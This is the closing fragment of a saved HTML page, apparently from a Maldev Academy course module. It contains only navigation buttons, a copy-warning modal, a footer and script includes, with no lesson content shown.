             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./81/complete" method="POST">
      </form>
      <form id="uncomplete-module" action="./8#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./82.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>



      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer></div>
        

        <script src="81_files/jquery-3.6.0.min.js"></script>
        <script src="81_files/bootstrap.min.js"></script>
        <script src="81_files/navbar.js"></script>
        


<link rel="preload" as="style" href="81_files/app-BoiX-DPv.css"><link rel="modulepreload" href="81_files/app-D9jIIQde.js"><link rel="stylesheet" href="81_files/app-BoiX-DPv.css"><style class="darkreader darkreader--sync" media="screen"></style><script type="module" src="81_files/app-D9jIIQde.js"></script><script src="81_files/moduleviewer.js" defer="defer"></script>

</body></html>